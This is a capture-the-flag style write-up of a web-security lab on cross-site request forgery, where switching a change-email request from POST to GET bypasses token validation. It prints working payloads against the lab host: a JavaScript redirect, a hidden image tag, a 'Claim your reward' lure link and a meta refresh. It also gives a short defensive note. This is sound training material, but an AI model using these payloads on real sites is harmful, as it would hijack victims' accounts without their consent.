# CSRF where token validation depends on request method

*A concise write‑up using my original steps (verbatim flow) with small, accurate notes. For authorized lab use only.*

---

## 🎯 Goal
**Deliver a link that changes another user’s email address.**

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** deliver link to change the email address of another user.
2. Use creds **wiener:peter** to log in and intercept the change‑email request.
3. Endpoint: **`/my-account/change-email`**.
4. Remove the CSRF param → server replies **`Missing parameter 'csrf'`**.
5. Tried token values: `true`, `"true"`, `1`, `None`, `'true'`, `'1'`, `1%00` → all **invalid token**.
6. Tried same‑length random tokens → **invalid**.
7. Lab description hints: **“CSRF where token validation depends on request method.”**
8. Tried `OPTIONS` → **405 Method Not Allowed**, response has header **`Allow: GET, POST`**.
9. In Burp: **Change request method** from `POST` to **`GET`** and remove `csrf` → **request succeeds**.
10. Because this now works with **GET**, we don’t need an HTML form. Use a JS redirect payload and deliver it to the victim:
    ```html
    <script>
      document.location = "https://0a46009f03a004208229d33300da0062.web-security-academy.net/my-account/change-email?email=abc@normal-user.net";
    </script>
    ```
11. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)

- The app validates the CSRF token **only for POST** (or only for some methods). When you switch to **GET**, the token check is skipped; the victim’s browser sends their **session cookies** with the cross‑site GET request, so the change is authenticated.
- **CORS isn’t needed** for classic CSRF: the browser will send cookies on a top‑level navigation or `<img>`/`<link>`/`<script>` GET automatically; we don’t need to read the response, just trigger the state change.
- **SameSite**: Labs often set `SameSite=None; Secure` or default‑less cookies, so cross‑site GETs still include cookies. If hardened with `SameSite=Lax/Strict`, this technique might be blocked unless it’s a top‑level navigation.

---

## 📦 Alternative exploit wrappers (optional)

- **Pure HTML (no JS):**
  ```html
  <img src="https://0a46009f03a004208229d33300da0062.web-security-academy.net/my-account/change-email?email=abc@normal-user.net" style="display:none">
  ```

- **Clickable lure:**
  ```html
  <a href="https://0a46009f03a004208229d33300da0062.web-security-academy.net/my-account/change-email?email=abc@normal-user.net">
    Claim your reward
  </a>
  ```

- **Meta refresh:**
  ```html
  <meta http-equiv="refresh" content="0;url=https://0a46009f03a004208229d33300da0062.web-security-academy.net/my-account/change-email?email=abc@normal-user.net">
  ```

> Defense: enforce CSRF on **all** state‑changing methods (including GET), check **Origin/Referer**, and use `SameSite` cookies where viable.

---

## 🧾 Raw artifacts (kept exactly)

- Allowed methods header observed: `Allow: GET, POST`
- Working exploit:
  ```html
  <script>document.location="https://0a46009f03a004208229d33300da0062.web-security-academy.net/my-account/change-email?email=abc@normal-user.net"</script>
  ```

---

## 🏁 Result
- By switching the method to **GET**, bypassed the token check and changed the victim’s email upon link visit. **Solved. ✅**
